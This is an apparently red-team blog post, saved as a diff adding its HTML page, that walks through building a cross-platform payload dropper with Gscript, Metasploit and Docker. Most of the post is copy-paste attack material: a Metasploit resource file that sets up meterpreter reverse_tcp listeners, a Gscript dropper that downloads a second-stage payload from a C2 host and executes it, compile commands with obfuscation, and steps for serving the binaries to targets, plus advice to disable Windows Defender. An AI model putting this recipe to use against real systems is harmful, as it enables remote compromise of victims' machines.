@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>Payload Delivery for DevOps : Building a Cross-Platform Dropper Using the Genesis Framework, Metasploit and Docker :: khast3x blog — Thoughts and notes on my side projects</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Abstract Setup 🔧  Docker  Building the Genesis Framework image   Metasploit Gscript   Serving the dropper 💥 Going further  To skip to the important parts, look for the small blue diamonds 🔹
+Abstract In this post, we&amp;rsquo;re creating a cross-platform payload dropper with an advanced, yet easy-to-use payload delivery framework called Gscript. Much like the &amp;ldquo;Infrastructure as Code&amp;rdquo; approach from DevOps, Genesis Framework (Gscript) enables the use of simplified code to configure and calibrate payload delivery and behavior."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="https://khast3x.club/posts/2020-06-27-Cross-Platform-Dropper/" />
+
+
+
+
+
+<link rel="stylesheet" href="https://khast3x.club/assets/style.css">
+
+
+<link rel="stylesheet" href="https://khast3x.club/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://khast3x.club/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="https://khast3x.club/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Payload Delivery for DevOps : Building a Cross-Platform Dropper Using the Genesis Framework, Metasploit and Docker"/>
+<meta name="twitter:description" content="Creating a modular, cross-platform payload dropper that checks the OS, and fetches the second stage payload using a single code base!"/>
+
+
+
+<meta property="og:title" content="Payload Delivery for DevOps : Building a Cross-Platform Dropper Using the Genesis Framework, Metasploit and Docker" />
+<meta property="og:description" content="Creating a modular, cross-platform payload dropper that checks the OS, and fetches the second stage payload using a single code base!" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://khast3x.club/posts/2020-06-27-Cross-Platform-Dropper/" />
+<meta property="article:published_time" content="2020-06-20T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-06-20T00:00:00+00:00" /><meta property="og:site_name" content="khast3x blog" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">khast3x blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title"><a href="https://khast3x.club/posts/2020-06-27-Cross-Platform-Dropper/">Payload Delivery for DevOps : Building a Cross-Platform Dropper Using the Genesis Framework, Metasploit and Docker</a></h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2020-06-20
+        </span>
+
+        
+          
+        
+      
+
+      
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          #<a href="https://khast3x.club/tags/dropper/">dropper</a>&nbsp;
+        
+          #<a href="https://khast3x.club/tags/docker/">docker</a>&nbsp;
+        
+          #<a href="https://khast3x.club/tags/metasploit/">metasploit</a>&nbsp;
+        
+          #<a href="https://khast3x.club/tags/gscript/">gscript</a>&nbsp;
+        
+          #<a href="https://khast3x.club/tags/redteam_infrastructure/">redteam_infrastructure</a>&nbsp;
+        
+      </span>
+    
+
+    
+
+    <div class="post-content">
+      
+      <ul>
+<li><a href="#abstract">Abstract</a></li>
+<li><a href="#setup-">Setup 🔧</a>
+<ul>
+<li><a href="#docker">Docker</a>
+<ul>
+<li><a href="#building-the-genesis-framework-image">Building the Genesis Framework image</a></li>
+</ul>
+</li>
+<li><a href="#metasploit">Metasploit</a></li>
+<li><a href="#gscript">Gscript</a></li>
+</ul>
+</li>
+<li><a href="#serving-the-dropper-">Serving the dropper 💥</a></li>
+<li><a href="#going-further">Going further</a></li>
+</ul>
+<!-- raw HTML omitted -->
+<p><em>To skip to the important parts, look for the small blue diamonds</em> 🔹</p>
+<h2 id="abstract">Abstract</h2>
+<p>In this post, we&rsquo;re creating a <strong>cross-platform payload dropper</strong> with an advanced, yet easy-to-use payload delivery framework called <a href="https://github.com/gen0cide/gscript">Gscript</a>.
+Much like the &ldquo;Infrastructure as Code&rdquo; approach from DevOps, Genesis Framework (Gscript) enables the use of <strong>simplified code to configure and calibrate payload delivery and behavior</strong>.</p>
+<p>From the Gscript Readme:</p>
+<blockquote>
+<p>Gscript is a framework for building multi-tenant executors for several implants in a stager. The engine works by embedding runtime logic (powered by the V8 Javascript Virtual Machine) for each persistence technique. This logic gets run at deploy time on the victim machine, in parallel for every implant contained with the stager. The Gscript engine leverages the multi-platform support of Golang to produce final stage one binaries for Windows, Mac, and Linux.</p>
+</blockquote>
+<p>Since Gscript uses small blocks of code that can be included in other Gscript files (.gs), it becomes <strong>very easy to atomically define our dropper&rsquo;s behavior</strong>, and adapt the final payload with <strong>elegantly chained presets and payloads</strong>. Gscript also includes obfuscation features, as well as a standard library.</p>
+<p>Knowing how to code in either Javascript or Golang is <strong>not required</strong>, although some general coding experience will be helpful.<br>
+-Reading this post, you can just copy and paste as described, replacing the IP value with your C2&rsquo;s IP (yey repeatable operations ✨).-</p>
+<p>The creators presented Gscript at <a href="https://www.youtube.com/watch?v=8yjMlMf8NpQ">DEFCON 22</a>, and included a large number of examples in a separate repository <a href="https://github.com/ahhh/gscripts">here</a>. This post is heavily inspired by <a href="https://github.com/ahhh/gscripts/blob/master/attack/multi/dropper/merlin_example.gs">this example</a>.</p>
+<p>Finally, they also shared the slides from the Gscript workshop <a href="https://github.com/ahhh/presentations/blob/master/DEFCON26%20GSCRIPT%20Workshop.pdf">here</a>, which I also highly recommend.</p>
+<p>This post acts as a small walk-through for deploying a cross-platform payload delivery backend, with a side of Docker containers to keep things quick &amp; clean.</p>
+<hr>
+<p><strong>What</strong></p>
+<p>We&rsquo;re going to set up Metasploit to deliver a Meterpreter payload for both Windows and Linux.<br>
+In a Gscript file (.gs), we&rsquo;re going to <strong>create a Gscript dropper</strong> that will check the OS, then fetch and execute the second stage payload according to the OS.<br>
+We&rsquo;ll then <strong>compile the script</strong> to an executable for both Windows and Linux.<br>
+The ideal setup is running the Docker host on a VPS somewhere in a data center.</p>
+<p><strong>How</strong></p>
+<p>We&rsquo;ll first spin up Metasploit with a resource file containing all the setup instructions.<br>
+Once the C2 is live, we&rsquo;ll use the generated URLs in a Gscript file. The code will be compiled using the Gscript container.</p>
+<p>C2 setup is similar to the <a href="https://khast3x.club/posts/2020-02-14-Intro-Modern-Routing-Traefik-Metasploit-Docker/">Introduction to Modern Routing for Red Team Infractures</a> post if you have read it.</p>
+<hr>
+<h2 id="setup-">Setup 🔧</h2>
+<h3 id="docker">Docker</h3>
+<p>This post assumes you&rsquo;ve already installed Docker. If not, check out the <a href="https://docs.docker.com/engine/install/ubuntu/">official documentation</a>. It should be no more than a few copy/pastes.</p>
+<h4 id="building-the-genesis-framework-image">Building the Genesis Framework image</h4>
+<p>First, we&rsquo;re going to create a clean working environment on our remote host with an empty shared folder, and pull the Gscript repository.</p>
+<p>🔹 On your Docker host:</p>
+<pre><code>$ mkdir gscript_tests
+$ cd gscript_tests
+$ mkdir shared
+$ git clone https://github.com/gen0cide/gscript.git
+</code></pre><p>💡 <em>The <code>./shared/</code> folder will be used as a shared folder between our containers and our host.</em></p>
+<p>Let&rsquo;s build the Gscript container with the latest code from the master branch.<br>
+<em>I had to add an ENV variable line 13 to avoid system <em>locales</em> breaking the build. Keep in mind this might be coming from my end since my locale is in <a href="https://www.youtube.com/watch?v=cfHSIrVh_wY">omelette du fromage 🇫🇷</a></em>. <!-- raw HTML omitted --></p>
+<p>🔹 In the same shell, run the following:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ sed -i <span style="color:#e6db74">&#39;13s/^/ENV DEBIAN_FRONTEND noninteractive /&#39;</span> gscript/build/Dockerfile
+$ docker build -t gscript ./gscript/build/
+</code></pre></div><p>If you wish to use the stable version instead, you can run:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ docker pull gen0cide/gscript:v1
+</code></pre></div><h3 id="metasploit">Metasploit</h3>
+<p>We&rsquo;re targeting both Windows x64 and Linux x64 using a Meterpreter reverse_tcp payload. <!-- raw HTML omitted --> <br>
+In the shared folder, let&rsquo;s create a Metasploit resource file to automate payload generation and callback listener.<br>
+Alternatively, you may also start ./msfconsole without any resource file and configure it manually.</p>
+<p>🔹 Open the new resource file:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ nano ./shared/msf_gscript.rc
+</code></pre></div><p>Here are the options to set for Metasploit. You can edit and copy them directly to the resource file that we&rsquo;ll mount to the Metasploit container.</p>
+<p>🔹 Copy the following in the file, replace <code>YOUR-C2-EXT-IP</code>, save and exit:</p>
+<pre><code>use exploit/multi/script/web_delivery
+set LHOST YOUR-C2-EXT-IP
+show targets
+
+set target 5
+set payload windows/x64/meterpreter_reverse_tcp
+set URIPATH delivery_tcp_windows
+set LPORT 4444
+set ReverseListenerBindPort 4444
+set SRVPORT 8080
+run
+
+set target 6
+set payload linux/x64/meterpreter_reverse_tcp
+set URIPATH delivery_tcp_linux
+set LPORT 4445
+set ReverseListenerBindPort 4445
+set SRVPORT 8081
+run
+</code></pre><p>🔹 To run the container, execute the following on your Docker host:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ pwd <span style="color:#75715e"># Check you&#39;re still in our ./gscript_tests/ folder</span>
+$ docker run -it -v <span style="color:#e6db74">`</span>pwd<span style="color:#e6db74">`</span>/shared:/shared -p4444:4444 -p8080:8080 -p4445:4445 -p8081:8081 metasploitframework/metasploit-framework bash
+$ ./msfconsole -r /shared/msf_gscript.rc
+</code></pre></div><p>You&rsquo;ll get an output showing you the payload URLs, and the associated command to run if you want to run the payload from shell directly.</p>
+<p><em>Please note that we&rsquo;re generating a vanilla meterpreter which will get caught by Windows Defender. Be sure to turn Real-Time protection Off when performing these tests. <a href="https://ired.team/offensive-security/defense-evasion">Here&rsquo;s a nice documentation on evasion</a>.</em></p>
+<h3 id="gscript">Gscript</h3>
+<p>Our Gscript file is basically JavaScript that can optionally import Golang modules.<br>
+Gscript will look for a function called <code>Deploy()</code> as entry point.
+Here are the general instructions of the code below:</p>
+<ul>
+<li>We&rsquo;re first going to import the Golang <code>os</code> library to determine the host&rsquo;s OS, and setting a timeout.</li>
+<li>Our entry point, the Deploy() function will generate a random name for our incoming payload, and work out the temporary path based on the OS.</li>
+<li>Based on the OS, we build the payload&rsquo;s full path, and call the Drop() function.</li>
+<li>The Drop() function fetches the payload according to the URL defined for the target&rsquo;s OS, and writes it to the full path.</li>
+<li>The <code>G</code> object gives us access to the <a href="https://github.com/gen0cide/gscript/tree/master/docs/stdlib">standard Gscript library</a>.</li>
+<li>We return to the Deploy() function and execute the downloaded payload asynchronously.</li>
+</ul>
+<p>🔹 Open a new shell to your Docker host. Open the new Gscript file:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ cd gscript_tests
+$ nano ./shared/double_delivery.gs
+</code></pre></div><p>🔹 And paste the following, replacing <code>YOUR-C2-EXT-IP</code>, save and exit:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#75715e">//timeout:150
+</span><span style="color:#75715e">//go_import:os as os
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Drop</span>(<span style="color:#a6e22e">drop_url</span>, <span style="color:#a6e22e">fullpath</span>) {
+
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">headers</span> <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;User-Agent&#34;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Hello-Dont-Look-Thx&#34;</span>};
+
+  <span style="color:#a6e22e">drop</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">G</span>.<span style="color:#a6e22e">requests</span>.<span style="color:#a6e22e">GetURLAsBytes</span>(<span style="color:#a6e22e">drop_url</span>, <span style="color:#a6e22e">headers</span>, <span style="color:#66d9ef">true</span>);
+  <span style="color:#a6e22e">errors</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">G</span>.<span style="color:#a6e22e">file</span>.<span style="color:#a6e22e">WriteFileFromBytes</span>(<span style="color:#a6e22e">fullpath</span>, <span style="color:#a6e22e">drop</span>[<span style="color:#ae81ff">1</span>]);
+  <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+}
+
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Deploy</span>() {
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">final_bin</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">G</span>.<span style="color:#a6e22e">rand</span>.<span style="color:#a6e22e">GetAlphaNumericString</span>(<span style="color:#ae81ff">6</span>);
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">tmppath</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">TempDir</span>();
+
+  <span style="color:#75715e">// Define your Metasploit delivery URLs here
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">windows_url</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://YOUR-C2-EXT-IP:8080/delivery_tcp_windows&#39;&#34;</span>;
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">linux_url</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://YOUR-C2-EXT-IP:8081/delivery_tcp_linux&#34;</span>;
+  
+  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">OS</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;windows&#34;</span>) {
+      <span style="color:#75715e">//if windows
+</span><span style="color:#75715e"></span>      <span style="color:#a6e22e">fullpath</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">tmppath</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;\\&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">final_bin</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;.exe&#34;</span>;
+      <span style="color:#a6e22e">Drop</span>(<span style="color:#a6e22e">windows_url</span>, <span style="color:#a6e22e">fullpath</span>);
+
+  } <span style="color:#66d9ef">else</span> {
+      <span style="color:#75715e">//if linux or OSX
+</span><span style="color:#75715e"></span>      <span style="color:#a6e22e">fullpath</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">tmppath</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">final_bin</span>;
+      <span style="color:#a6e22e">Drop</span>(<span style="color:#a6e22e">linux_url</span>, <span style="color:#a6e22e">fullpath</span>);
+  }
+  
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">running</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">G</span>.<span style="color:#a6e22e">exec</span>.<span style="color:#a6e22e">ExecuteCommandAsync</span>(<span style="color:#a6e22e">fullpath</span>, [<span style="color:#e6db74">&#34;&#34;</span>]);
+  
+  <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+}
+</code></pre></div><p><em>This is the condensed version. A version including error checks and console outputs can be found <a href="https://gist.github.com/khast3x/4ecb659508d310b535e857fe67c0f2eb">here</a></em></p>
+<p>Let&rsquo;s launch the Gscript container we built earlier and mount our shared folder.</p>
+<p>🔹 In your terminal, launch:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ docker run -it -v <span style="color:#e6db74">`</span>pwd<span style="color:#e6db74">`</span>/shared:/shared gscript
+</code></pre></div><p>When compiling the dropper, you can either choose to compile <strong>with</strong> obfuscation, disabling console and debug messages, or <strong>without</strong> obfuscation, enabling console messages. You can also enable upx compression, additional imports and more with build args. You can check out the documentation for compilation <a href="https://github.com/gen0cide/gscript/blob/master/docs/tutorials/08_0_compiling.md">here</a>.</p>
+<p>🔹 Compiling <strong>with</strong> obfuscation, suppressing console messages:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ gscript compile --output-file /shared/windows_dropper.exe --os windows /shared/double_delivery.gs
+
+$ gscript compile --output-file /shared/linux_dropper.bin --os linux /shared/double_delivery.gs
+</code></pre></div><p>🔹 Or compiling <strong>without</strong> obfuscation, enabling console messages:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ gscript compile --output-file /shared/windows_dropper.exe --os windows --obfuscation-level <span style="color:#ae81ff">3</span> /shared/double_delivery.gs
+
+$ gscript compile --output-file /shared/linux_dropper.bin --os linux --obfuscation-level <span style="color:#ae81ff">3</span> /shared/double_delivery.gs
+</code></pre></div><h2 id="serving-the-dropper-">Serving the dropper 💥</h2>
+<p>We can now exit the Gscript shell and serve the generated files to our targets. We&rsquo;re going to serve the payloads through a simple HTTP web server. In this case we&rsquo;re using Python 2, but you can now distribute the binaries in the <code>shared/</code> directory.</p>
+<p>🔹 Exit the Gscript container, and run the following:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">[</span>CTRL+d<span style="color:#f92672">]</span>
+
+$ cd shared
+$ python -m SimpleHTTPServer <span style="color:#ae81ff">9000</span>
+
+<span style="color:#75715e"># If using python3 as default:</span>
+$ python3 -m http.server <span style="color:#ae81ff">9000</span>
+</code></pre></div><p>Open your browser to http://YOUR-EXT-C2-IP:9000 on your target, download the appropriate dropper and hopefully <strong>you&rsquo;ll be getting a Meterpreter delivery and execution on two different OS from the same code base</strong>.</p>
+<p><a href="/assets/C2/gscriptmsf_final.png">
+  <figure class="center" >
+    <img src="/assets/C2/gscriptmsf_final.png"   style="border-radius: 16px;"  />
+    
+      <figcaption class="center" >Both platforms calling back after using Gscript as dropper</figcaption>
+    
+  </figure>
+
+</a></p>
+<h2 id="going-further">Going further</h2>
+<p>Now that we can easily deploy C2s, wouldn&rsquo;t it be nice if we could have clean way of creating redirectors, proxies or fronting technics, with repeatable deployment configuration?</p>
+<p>If that tickles your fancy, be sure to check out my previous post; <a href="https://khast3x.club/posts/2020-02-14-Intro-Modern-Routing-Traefik-Metasploit-Docker">Introduction to Modern Routing for Red Team Infracture</a> for doing just that. It comes with a clean interface for monitoring your services too!</p>
+
+    </div>
+    
+
+
+    
+      
+    
+
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">khast3x blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span>Theme created by <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://khast3x.club/assets/main.js"></script>
+<script src="https://khast3x.club/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+      
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-113498686-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    
+  </body>
+</html>
